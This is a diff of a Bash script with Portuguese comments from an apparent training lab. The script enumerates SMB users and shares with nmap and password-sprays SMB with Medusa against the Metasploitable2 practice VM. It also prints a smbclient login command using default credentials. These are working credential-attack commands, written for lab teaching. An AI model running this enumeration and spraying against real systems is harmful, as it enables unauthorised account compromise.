@@ -1,13 +1,15 @@
 #!/usr/bin/env bash
 #
 # 03_smb_password_spray.sh
-# Enumeração de usuários via SMB (Samba) e password spraying
-# contra o Metasploitable2.
+# Enumeracao de usuarios via SMB e password spraying contra o
+# Metasploitable2.
 #
 # Password spraying = tentar UMA (ou poucas) senha(s) comuns contra
-# MUITOS usuários, em vez de muitas senhas contra um único usuário.
-# Isso reduz o risco de lockout de conta e é uma técnica realista
-# usada por atacantes.
+# MUITOS usuarios, em vez de muitas senhas contra um unico usuario.
+# Isso reduz o risco de lockout de conta e e uma tecnica realista
+# usada por atacantes contra ambientes corporativos.
+#
+# Detalhes completos: docs/cenario-3-smb.md
 #
 # USO:
 #   ./03_smb_password_spray.sh <IP_DO_METASPLOITABLE>
@@ -15,24 +17,18 @@
 set -euo pipefail
 
 TARGET="${1:?Uso: $0 <IP_DO_ALVO>}"
-USERS="../wordlists/usuarios.txt"
-SPRAY_PASSWORDS="senhas_spray.txt"
+USERS="../wordlists/smb_usuarios.txt"
+SPRAY_PASSWORDS="../wordlists/smb_senhas.txt"
 
-echo "[*] 1) Enumeração de usuários e compartilhamentos via SMB"
+echo "[*] 1) Enumeracao de usuarios e compartilhamentos via SMB"
+echo "    (sem autenticacao -- atencao se isso funcionar, e uma falha grave)"
 nmap -p 139,445 --script smb-enum-users,smb-enum-shares "$TARGET"
 
-echo "[*] 2) (Opcional) Enumeração complementar com enum4linux"
-# enum4linux -a "$TARGET"
+echo ""
+echo "[*] 2) Password spraying com Medusa contra o servico SMB"
+echo "    (sem -f, para observar o comportamento contra todos os usuarios)"
+medusa -h "$TARGET" -U "$USERS" -P "$SPRAY_PASSWORDS" -M smbnt -t 3
 
-echo "[*] 3) Gerando lista reduzida de senhas para spraying (poucas tentativas por usuário)"
-cat > "$SPRAY_PASSWORDS" <<EOF
-msfadmin
-123456
-password
-EOF
-
-echo "[*] 4) Password spraying com Medusa contra o serviço SMB"
-medusa -h "$TARGET" -U "$USERS" -P "$SPRAY_PASSWORDS" -M smbnt -t 3 -f
-
-echo "[*] Concluído. Compare o tempo de resposta/bloqueios entre este método"
-echo "    e o ataque de força bruta tradicional do passo 01."
+echo ""
+echo "[*] 3) Validacao manual (ajuste USER:PASS conforme o resultado acima)"
+echo "    smbclient -L $TARGET -U msfadmin%msfadmin"
